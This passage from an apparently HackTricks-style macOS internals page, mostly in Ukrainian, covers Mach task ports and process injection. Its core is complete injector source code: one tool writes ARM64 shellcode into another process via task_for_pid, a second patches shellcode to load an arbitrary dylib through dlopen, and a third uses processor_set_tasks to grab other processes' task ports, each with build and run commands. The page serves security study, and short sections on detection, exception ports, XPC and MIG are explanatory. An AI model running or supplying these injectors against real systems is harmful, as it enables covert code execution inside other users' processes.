// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Скомпілюйте** попередню програму та додайте **entitlements**, щоб мати можливість інжектувати код з тим самим користувачем (якщо ні, вам потрібно буде використовувати **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Для цього, щоб це працювало на iOS, вам потрібен entitlement `dynamic-codesigning`, щоб мати можливість створити виконувану пам'ять, що підлягає запису.

### Впровадження Dylib в потік через порт завдання

У macOS **потоки** можуть бути маніпульовані через **Mach** або за допомогою **posix `pthread` api**. Потік, який ми створили в попередньому впровадженні, був створений за допомогою Mach api, тому **він не відповідає стандартам posix**.

Було можливим **впровадити простий shellcode** для виконання команди, оскільки він **не потребував роботи з posix** сумісними api, лише з Mach. **Більш складні впровадження** вимагатимуть, щоб **потік** також був **сумісний з posix**.

Отже, щоб **покращити потік**, він повинен викликати **`pthread_create_from_mach_thread`**, що **створить дійсний pthread**. Потім цей новий pthread може **викликати dlopen**, щоб **завантажити dylib** з системи, тому замість написання нового shellcode для виконання різних дій, можна завантажити користувацькі бібліотеки.

Ви можете знайти **приклади dylibs** (наприклад, той, що генерує журнал, а потім ви можете його прослухати):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

У цій техніці потік процесу захоплюється:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Коли викликається `task_for_pid` або `thread_create_*`, це збільшує лічильник у структурі task з ядра, до якого можна отримати доступ з режиму користувача, викликавши task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Коли в потоці виникає виняток, цей виняток надсилається на призначений порт винятків потоку. Якщо потік не обробляє його, тоді він надсилається на порти винятків завдання. Якщо завдання не обробляє його, тоді він надсилається на порт хоста, який керується launchd (де він буде визнаний). Це називається триажем винятків.

Зверніть увагу, що в кінці, зазвичай, якщо не обробити належним чином, звіт буде оброблений демоном ReportCrash. Однак можливо, що інший потік у тому ж завданні обробляє виняток, це те, що роблять інструменти звітності про збої, такі як `PLCreashReporter`.

## Other Objects

### Clock

Будь-який користувач може отримати доступ до інформації про годинник, однак для того, щоб встановити час або змінити інші налаштування, потрібно бути root.

Щоб отримати інформацію, можна викликати функції з підсистеми `clock`, такі як: `clock_get_time`, `clock_get_attributtes` або `clock_alarm`\
Щоб змінити значення, можна використовувати підсистему `clock_priv` з функціями, такими як `clock_set_time` і `clock_set_attributes`.

### Processors and Processor Set

API процесора дозволяє контролювати один логічний процесор, викликаючи функції, такі як `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Більше того, API **набору процесорів** надає спосіб групувати кілька процесорів в одну групу. Можна отримати стандартний набір процесорів, викликавши **`processor_set_default`**.\
Це деякі цікаві API для взаємодії з набором процесорів:

- `processor_set_statistics`
- `processor_set_tasks`: Повертає масив прав на відправлення для всіх завдань всередині набору процесорів
- `processor_set_threads`: Повертає масив прав на відправлення для всіх потоків всередині набору процесорів
- `processor_set_stack_usage`
- `processor_set_info`

Як згадувалося в [**цьому пості**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), раніше це дозволяло обійти раніше згадану захист, щоб отримати порти завдань в інших процесах, контролюючи їх, викликавши **`processor_set_tasks`** і отримуючи порт хоста для кожного процесу.\
Сьогодні вам потрібен root, щоб використовувати цю функцію, і це захищено, тому ви зможете отримати ці порти лише в незахищених процесах.

Ви можете спробувати це з:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
